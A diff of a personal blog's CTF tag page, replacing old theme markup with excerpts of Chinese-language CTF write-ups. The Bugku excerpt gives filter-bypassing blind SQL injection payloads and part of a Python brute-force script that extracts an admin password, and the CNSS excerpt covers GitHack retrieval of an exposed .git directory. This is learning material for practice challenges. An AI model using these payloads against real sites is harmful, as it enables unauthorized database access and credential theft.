@@ -1,580 +1,370 @@
-<!DOCTYPE html>
-<html lang="zh" itemscope itemtype="http://schema.org/WebPage">
-<head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title>CTF · Hi, Yiming</title>
-  
-
-<meta name="renderer" content="webkit" />
-<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes"/>
-
-<meta name="MobileOptimized" content="width"/>
-<meta name="HandheldFriendly" content="true"/>
-
-
-<meta name="applicable-device" content="pc,mobile">
-
-<meta name="theme-color" content="#f8f5ec" />
-<meta name="msapplication-navbutton-color" content="#f8f5ec">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
-
-<meta name="mobile-web-app-capable" content="yes">
-
-<meta name="author" content="Yiming" />
-  <meta name="description" content="A site built by Yiming." />
-  <meta name="keywords" content="Photographer, CTFer, lazyGeek" />
-
-
-
-
-
-
-<meta name="generator" content="Hugo 0.91.0" />
-
-
-<link rel="canonical" href="https://shenyimings.github.io/tags/ctf/" />
-<link href="/tags/ctf/index.xml" rel="alternate" type="application/rss+xml" title="Hi, Yiming" />
-
-
-
-
-<link rel="icon" href="/favicon.ico" />
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/sass/jane.min.b3a8813c06e6d785beba22bf8264e174fa2cb3a396b22f9ba24e2c00c18aaf7f.css" integrity="sha256-s6iBPAbm14W&#43;uiK/gmThdPoss6OWsi&#43;bok4sAMGKr38=" media="screen" crossorigin="anonymous">
-
-
-
-
-
-<meta property="og:title" content="CTF" />
-<meta property="og:description" content="A site built by Yiming." />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://shenyimings.github.io/tags/ctf/" />
-
-<meta itemprop="name" content="CTF">
-<meta itemprop="description" content="A site built by Yiming."><meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="CTF"/>
-<meta name="twitter:description" content="A site built by Yiming."/>
-
-<!--[if lte IE 9]>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
-<![endif]-->
-
-<!--[if lt IE 9]>
-  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
-<![endif]-->
-
-
-
-
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>CTF | Console.makeHappy(_1ming)</title>
+<meta name=keywords content>
+<meta name=description content="Yiming' blog">
+<meta name=author content="Me">
+<link rel=canonical href=https://shenyimings.github.io/tags/ctf/>
+<meta name=google-site-verification content="XYZabc">
+<meta name=yandex-verification content="XYZabc">
+<meta name=msvalidate.01 content="XYZabc">
+<link href=/assets/css/stylesheet.min.746a86b58bb2b052b5e4df8216510494f04f81e62c08d626150c26c69ca929da.css integrity="sha256-dGqGtYuysFK15N+CFlEElPBPgeYsCNYmFQwmxpypKdo=" rel="preload stylesheet" as=style>
+<link rel=icon href=https://shenyimings.github.io/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://shenyimings.github.io/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://shenyimings.github.io/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://shenyimings.github.io/apple-touch-icon.png>
+<link rel=mask-icon href=https://shenyimings.github.io/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.91.0">
+<link rel=alternate type=application/rss+xml href=https://shenyimings.github.io/tags/ctf/index.xml>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css integrity=sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X crossorigin=anonymous>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js integrity=sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4 crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js integrity=sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa crossorigin=anonymous onload=renderMathInElement(document.body)></script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-123-45','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+<meta property="og:title" content="CTF">
+<meta property="og:description" content="Yiming' blog">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://shenyimings.github.io/tags/ctf/"><meta property="og:image" content="https://shenyimings.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="og:site_name" content="Yiming">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://shenyimings.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E">
+<meta name=twitter:title content="CTF">
+<meta name=twitter:description content="Yiming' blog">
 </head>
-<body>
-  <div id="mobile-navbar" class="mobile-navbar">
-  <div class="mobile-header-logo">
-    <a href="/" class="logo">Yiming</a>
-  </div>
-  <div class="mobile-navbar-icon">
-    <span></span>
-    <span></span>
-    <span></span>
-  </div>
+<body class=list id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<noscript>
+<style type=text/css>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://shenyimings.github.io/ accesskey=h title="> 相位  (Alt + H)">
+<img src=/apple-touch-icon.png alt=logo aria-label=logo height=35>> 相位 </a>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
 </div>
-<nav id="mobile-menu" class="mobile-menu slideout-menu">
-  <ul class="mobile-menu-list">
-    <li class="mobile-menu-item">
-        
-          
-          
-            <a class="menu-item-link" href="https://shenyimings.github.io/">Home</a>
-          
-        
-      </li><li class="mobile-menu-item">
-        
-          
-          
-            <a class="menu-item-link" href="https://shenyimings.github.io/post/">Archives</a>
-          
-        
-      </li><li class="mobile-menu-item">
-        
-          
-          
-            <a class="menu-item-link" href="https://shenyimings.github.io/tags/">Tags</a>
-          
-        
-      </li><li class="mobile-menu-item">
-        
-          
-          
-            <a class="menu-item-link" href="https://shenyimings.github.io/categories/">Categories</a>
-          
-        
-      </li><li class="mobile-menu-item">
-        
-          
-          
-            <a class="menu-item-link" href="https://shenyimings.github.io/about/">关于</a>
-          
-        
-      </li>
-    
-
-    
-  </ul>
+<ul id=menu onscroll=menu_on_scroll()>
+<li>
+<a href=https://shenyimings.github.io/archive/ title=归档>
+<span>归档</span>
+</a>
+</li>
+<li>
+<a href=https://shenyimings.github.io/categories/ title=分类>
+<span>分类</span>
+</a>
+</li>
+<li>
+<a href=https://shenyimings.github.io/tags/ title=标签>
+<span>标签</span>
+</a>
+</li>
+<li>
+<a href=https://shenyimings.github.io/search/ title="搜索 (Alt + /)" accesskey=/>
+<span>搜索</span>
+</a>
+</li>
+<li>
+<a href=https://shenyimings.github.io/about/ title=关于>
+<span>关于</span>
+</a>
+</li></ul>
 </nav>
-
-
-  
-    
-
-
-
-
-
-
-  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
-  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
-
-
-
-
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-<div class="pswp__bg"></div>
-
-<div class="pswp__scroll-wrap">
-    
-    <div class="pswp__container">
-      <div class="pswp__item"></div>
-      <div class="pswp__item"></div>
-      <div class="pswp__item"></div>
-    </div>
-    
-    <div class="pswp__ui pswp__ui--hidden">
-    <div class="pswp__top-bar">
-      
-      <div class="pswp__counter"></div>
-      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-      <button class="pswp__button pswp__button--share" title="Share"></button>
-      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-      
-      
-      <div class="pswp__preloader">
-        <div class="pswp__preloader__icn">
-          <div class="pswp__preloader__cut">
-            <div class="pswp__preloader__donut"></div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-      <div class="pswp__share-tooltip"></div>
-    </div>
-    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-    </button>
-    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-    </button>
-    <div class="pswp__caption">
-      <div class="pswp__caption__center"></div>
-    </div>
-    </div>
-    </div>
+</header>
+<main class=main>
+<header class=page-header>
+<div class=breadcrumbs>
+<a href=https://shenyimings.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://shenyimings.github.io/tags/>Tags</a>
 </div>
-
-  
-
-  
-
-  
-
-  <header id="header" class="header container">
-    <div class="logo-wrapper">
-  <a href="/" class="logo">
-    
-      Yiming
-    
-  </a>
-</div>
-
-<nav class="site-navbar">
-  <ul id="menu" class="menu">
-    
-    
-        <li class="menu-item">
-        
-          
-          
-            <a class="menu-item-link" href="https://shenyimings.github.io/">Home</a>
-          
-
-        
-
-      </li>
-    
-        <li class="menu-item">
-        
-          
-          
-            <a class="menu-item-link" href="https://shenyimings.github.io/post/">Archives</a>
-          
-
-        
-
-      </li>
-    
-        <li class="menu-item">
-        
-          
-          
-            <a class="menu-item-link" href="https://shenyimings.github.io/tags/">Tags</a>
-          
-
-        
-
-      </li>
-    
-        <li class="menu-item">
-        
-          
-          
-            <a class="menu-item-link" href="https://shenyimings.github.io/categories/">Categories</a>
-          
-
-        
-
-      </li>
-    
-        <li class="menu-item">
-        
-          
-          
-            <a class="menu-item-link" href="https://shenyimings.github.io/about/">关于</a>
-          
-
-        
-
-      </li>
-    
-
-    
-    
-
-    
-  </ul>
-</nav>
-
-  </header>
-
-  <div id="mobile-panel">
-    <main id="main" class="main bg-llight">
-      <div class="content-wrapper">
-        <div id="content" class="content container">
-          
-
-<section id="archive" class="archive">
-  
-    
-      <div class="archive-title tag">
-        <h2 class="archive-name">Tag: CTF</h2>
-      </div>
-    
-  
-
-  
-    <div class="archive-post">
-      <time datetime="2021-10-24" class="archive-post-time">
-        2021-10-24
-      </time>
-      <span class="archive-post-title">
-        <a href="/post/15.bugku-sql%E6%B3%A8%E5%85%A5/" class="archive-post-link">
-          Bugku-SQL注入-WriteUP
-        </a>
-      </span>
-    </div>
-  
-    <div class="archive-post">
-      <time datetime="2021-10-21" class="archive-post-time">
-        2021-10-21
-      </time>
-      <span class="archive-post-title">
-        <a href="/post/14.cnss-recruit-web-write-up/" class="archive-post-link">
-          CNSS Recruit-Web Write UP
-        </a>
-      </span>
-    </div>
-  
-    <div class="archive-post">
-      <time datetime="2021-10-20" class="archive-post-time">
-        2021-10-20
-      </time>
-      <span class="archive-post-title">
-        <a href="/post/13.rce%E4%B8%93%E6%A0%8F/" class="archive-post-link">
-          RCE 远程命令执行漏洞
-        </a>
-      </span>
-    </div>
-  
-    <div class="archive-post">
-      <time datetime="2021-08-19" class="archive-post-time">
-        2021-08-19
-      </time>
-      <span class="archive-post-title">
-        <a href="/post/12.moectf-web-write-up/" class="archive-post-link">
-          MoeCTF 2021 西电新生赛WP
-        </a>
-      </span>
-    </div>
-  
-    <div class="archive-post">
-      <time datetime="2021-08-05" class="archive-post-time">
-        2021-08-05
-      </time>
-      <span class="archive-post-title">
-        <a href="/post/9.dvwa%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&#43;burpsuite2.1%E5%AE%89%E8%A3%85/" class="archive-post-link">
-          DVWA环境搭建 &#43; BurpSuite2.1安装 &#43; Chrome配置
-        </a>
-      </span>
-    </div>
-  
-    <div class="archive-post">
-      <time datetime="2021-07-23" class="archive-post-time">
-        2021-07-23
-      </time>
-      <span class="archive-post-title">
-        <a href="/post/6.bugku_misc/" class="archive-post-link">
-          MISC类型题目及技巧
-        </a>
-      </span>
-    </div>
-  
-    <div class="archive-post">
-      <time datetime="2021-07-21" class="archive-post-time">
-        2021-07-21
-      </time>
-      <span class="archive-post-title">
-        <a href="/post/3.ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/" class="archive-post-link">
-          CTF比赛方向选择
-        </a>
-      </span>
-    </div>
-  
-    <div class="archive-post">
-      <time datetime="2021-07-20" class="archive-post-time">
-        2021-07-20
-      </time>
-      <span class="archive-post-title">
-        <a href="/post/2.ubuntu%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/" class="archive-post-link">
-          Ubuntu 18.04 LTS的配置与入门
-        </a>
-      </span>
-    </div>
-  
-    <div class="archive-post">
-      <time datetime="2021-07-19" class="archive-post-time">
-        2021-07-19
-      </time>
-      <span class="archive-post-title">
-        <a href="/post/1.markdown%E7%AC%94%E8%AE%B0%E5%AD%A6%E4%B9%A0/" class="archive-post-link">
-          学习Markdown语法
-        </a>
-      </span>
-    </div>
-  
+<h1>CTF</h1>
+</header>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+Bugku-SQL注入-WriteUP
+</h2>
+</header>
+<section class=entry-content>
+<p>题目网址：sql注入
+一个很正经的界面，有实战那味了。
+上来先尝试经典组合：
+admin~password
+很幸运，用户名猜中了。
+利用单引号检测是否存在SQL注入
+admin' or 1 = 1
+报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：
+'
+or
+&lt;>(不等号)
+#
+()
+空格可用括号代替，等号可用相反的不等号
+先尝试是否存在布尔注入：
+成功，用户名存在注入~
+之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）
+select password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload
+1'or((ascii(mid((select(password)from(admin))from(1))))&lt;>9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难
+我们尝试下集束炸弹，让两个参数都作为目标
+第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码
+爆破成功了。。。
+接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：
+4dcc88f8f1bc05e7c2ad1a60288481a2
+去md5破解站破解一下，成功解出密码：
+bugkuctf
+结束了……
+反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。
+贴一组大神的python自动脚本，以供学习
+#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = 'http://114.67.246.176:19665/' sss = string.digits + (string.ascii_lowercase) a = '' for i in range(1, 50): flag = 0 for j in sss: payload = "admin'^((ascii(mid((select(password)from(admin))from(%s))))&lt;>%s)^1#" % (i, ord(j)) #屏蔽了","，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #&lt;>表示不等号 #^表示异或 payload2= "admin123'or((ascii(mid((select(password)from(admin))from(%s))))&lt;>%s)#"%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= "admin123'or((ascii(mid((select(database()))from(%s))))&lt;>%s)#"%(i,ord(j)) data = {'username': payload, 'password': 'admin'} res = requests....</p>
 </section>
-
-
-
-
-
-
-  
-  
-  
-
-  
-  
-
-  
-  
-
-  
-  
-
-  
-  
-
-
-
-
-
-        </div>
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="icon-links">
-  
-  
-    <a href="mailto:seuilping@gmail.com" rel="me noopener" class="iconfont"
-      title="email" >
-      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
-  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
-  width="36" height="36">
-  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
-</svg>
-
-    </a>
-  
-    <a href="https://github.com/shenyimings/" rel="me noopener" class="iconfont"
-      title="github"  target="_blank"
-      >
-      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
-  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
-  width="36" height="36">
-  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
-</svg>
-
-    </a>
-  
-    <a href="https://www.zhihu.com/people/shen-yi-ming-91" rel="me noopener" class="iconfont"
-      title="zhihu"  target="_blank"
-      >
-      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
-  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
-  width="36" height="36">
-  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
-  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
-</svg>
-
-    </a>
-  
-    <a href="https://www.instagram.com/shenyimings/" rel="me noopener" class="iconfont"
-      title="instagram"  target="_blank"
-      >
-      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
-  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
-  width="36" height="36">
-  <path d="M853.333333 277.333333C853.333333 289.28 843.946667 298.666667 832 298.666667L746.666667 298.666667C734.72 298.666667 725.333333 289.28 725.333333 277.333333L725.333333 192C725.333333 180.053333 734.72 170.666667 746.666667 170.666667L832 170.666667C843.946667 170.666667 853.333333 180.053333 853.333333 192M192 853.333333C180.053333 853.333333 170.666667 843.946667 170.666667 832L170.666667 469.333333 259.84 469.333333C257.28 482.986667 256 497.493333 256 512 256 653.226667 370.773333 768 512 768 653.226667 768 768 653.226667 768 512 768 497.493333 766.293333 482.986667 764.16 469.333333L853.333333 469.333333 853.333333 832C853.333333 843.946667 843.946667 853.333333 832 853.333333M512 341.333333C606.293333 341.333333 682.666667 417.706667 682.666667 512 682.666667 606.293333 606.293333 682.666667 512 682.666667 417.706667 682.666667 341.333333 606.293333 341.333333 512 341.333333 417.706667 417.706667 341.333333 512 341.333333M853.333333 85.333333 170.666667 85.333333C123.306667 85.333333 85.333333 123.306667 85.333333 170.666667L85.333333 853.333333C85.333333 900.266667 123.733333 938.666667 170.666667 938.666667L853.333333 938.666667C900.266667 938.666667 938.666667 900.266667 938.666667 853.333333L938.666667 170.666667C938.666667 123.306667 900.266667 85.333333 853.333333 85.333333Z"></path>
-</svg>
-
-    </a>
-
-
-<a href="https://shenyimings.github.io/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
-    class="iconfont" title="rss" target="_blank">
-    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
-  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
-  width="30" height="30">
-  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
-</svg>
-
-  </a>
-   
-</div>
-
-<div class="copyright">
-  <span class="power-by">
-    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
-  </span>
-  <span class="division">|</span>
-  <span class="theme-info">
-    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
-  </span>
-
-  <span class="copyright-year">
-    &copy;
-    
-      2021 -
-    2022
-    <span class="heart">
-      
-      <i class="iconfont">
-        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
-  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
-  width="14" height="14">
-  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
-   fill="#8a8a8a"></path>
-</svg>
-
-      </i>
-    </span><span class="author">
-        Yiming
-        
-      </span></span>
-
-  
-  
-
-  
-</div>
-
-    </footer>
-
-    <div class="back-to-top" id="back-to-top">
-      <i class="iconfont">
-        
-        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
-  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
-  width="35" height="35">
-  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
-</svg>
-
-      </i>
-    </div>
-  </div>
-  
-<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
-  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
-
-
-
-
-<script type="text/javascript" src="/js/main.dee43230127a73d039a734510fa896c89c3c7ce0cf0be0c7a7433f8fd69b76dc.js" integrity="sha256-3uQyMBJ6c9A5pzRRD6iWyJw8fODPC&#43;DHp0M/j9abdtw=" crossorigin="anonymous"></script>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
-    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
-    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<footer class=entry-footer>
+October 24, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to Bugku-SQL注入-WriteUP" href=https://shenyimings.github.io/post/15.bugku-sql%E6%B3%A8%E5%85%A5/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>
+CNSS Recruit-Web Write UP
+</h2>
+</header>
+<section class=entry-content>
+<p>前言 躺在床上，不想动鼠标，那就先写写前言吧。
+这个CTF比赛是我打的第二场比较正规、完整的比赛。
+惨不忍睹，当然，作为刚入门的noob来说也可以接受。
+希望能通过笔记的整理消化新掌握的知识，道阻且长。
+[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。
+关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.
+python2 .\GitHack.py http:\\x.x.x\.git 运行后即得到git目录。
+Git版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。
+git log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。
+其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。
+[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。
+第一反应是绕过和注入咯，尝试后无果。
+再观察续一秒按钮前端代码，发现是安慰剂按钮。。。
+那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：
